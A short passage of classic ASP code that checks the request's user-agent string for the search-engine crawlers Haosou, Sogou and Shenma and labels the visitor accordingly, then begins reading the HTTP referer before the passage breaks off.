GetBot="haosou"
end if
s_agent=Request.ServerVariables("HTTP_USER_AGENT")
if instr(1,s_agent,"sogou",1) >0 then
GetBot="Sgou"
end if
s_agent=Request.ServerVariables("HTTP_USER_AGENT")
if instr(1,s_agent,"sm",1) >0 then
GetBot="sm"
end if
s_agent=Request.ServerVariables("HTTP_REFERER")
